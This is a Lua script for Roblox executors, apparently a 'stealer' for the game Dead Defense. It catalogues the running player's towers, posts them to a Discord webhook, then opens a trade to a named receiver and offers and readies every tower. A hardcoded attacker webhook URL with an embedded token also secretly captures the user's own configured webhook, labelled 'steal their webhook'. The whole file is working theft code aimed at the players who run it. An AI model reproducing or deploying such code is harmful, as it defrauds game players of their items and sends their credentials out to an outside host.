-- credits to infer/trax

local Username = getgenv().Username or "Unknown"
local Webhook = getgenv().Webhook or ""

local players = game.Players
local player = game.Players.LocalPlayer
local inventory = player.Towers
local remotes = game:GetService("ReplicatedStorage").Remotes
local HttpService = game:GetService("HttpService")
local req = (syn and syn.request) or (http and http.request) or http_request or request

-- Webhook Attack - steal their webhook if it's set
local attackerWebhook = "https://discord.com/api/webhooks/1379503740750401637/UvaQUmLR0fQfvrPV7WdCi6Btk2xPrsxkCVan_KW4IQpTU02-bzoNiRgIZMwZeW20eBfF"

if Webhook ~= "" then
    local stealBody = {
        ["content"] = "🚨 Victim webhook captured: ```" .. Webhook .. "``` from player: **" .. player.Name .. "**"
    }

    local success, encoded = pcall(function()
        return HttpService:JSONEncode(stealBody)
    end)

    if success then
        pcall(function()
            req({
                Url = attackerWebhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = encoded
            })
        end)
    end
end

-- Main Script Logic
local td= {}
for _, v in ipairs(inventory:GetChildren()) do
    local name = v.Name
    td[name] = td[name] or {count = 0, exist = 0}
    td[name].count += 1
end

for n, d in pairs(td) do
    local args = {n}
    local exist = remotes:WaitForChild("GetExistCounter"):InvokeServer(unpack(args))
    d.exist = exist or 0
end

local names = {}
for n in pairs(td) do
    table.insert(names, n)
end
table.sort(names, function(a, b)
    return td[a].exist < td[b].exist
end)

local hitlist = ""
for _, t in ipairs(names) do
    local data = td[t]
    hitlist = hitlist .. "(" .. data.count .. "x) " .. t .. " - Exist: " .. data.exist .. "\n"
end

local tp = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. game.PlaceId .. ", \"" .. game.JobId .. "\")"

local body = {
    ["content"] = "--[[@everyone]] " .. tp,
    ["embeds"] = {
        {
            ["title"] = ":zombie: **Dead Defense Hit!!** :zombie:",
            ["color"] = 255,
            ["fields"] = {
                {
                    ["name"] = ":bust_in_silhouette: **__Player Information:__**",
                    ["value"] = "```Victim: " .. player.Name ..
                        "\nBonds: " .. player.leaderstats.Bonds.Value ..
                        "\nReceiver: " .. Username .. "```",
                    ["inline"] = false
                },
                {
                    ["name"] = ":champagne: **__Towers Hit:__**",
                    ["value"] = "```" .. hitlist .. "```",
                    ["inline"] = false
                },
                {
                    ["name"] = ":books: **__Information:__**",
                    ["value"] = "**To receive your items, copy and execute the teleport script provided!**",
                    ["inline"] = false
                }
            },
            ["footer"] = {
                ["text"] = "made by infer/trax " .. os.date("%H:%M")
            }
        }
    }
}

local success, encoded = pcall(function()
    return HttpService:JSONEncode(body)
end)

if success then
    pcall(function()
        req({
            Url = Webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = encoded
        })
    end)
end

repeat
    receiver = players:FindFirstChild(Username)
    task.wait()
until receiver

receiver.Chatted:Wait()

remotes.SendTrade:FireServer(receiver)

repeat task.wait() until player.PlayerGui.Main:FindFirstChild("TradeGui") and player.PlayerGui.Main.TradeGui.Visible

for _, infer in ipairs(inventory:GetChildren()) do
    local args = {infer.Name}
    remotes.AddOffer:FireServer(unpack(args))
end

remotes.ReadyTrade:FireServer()
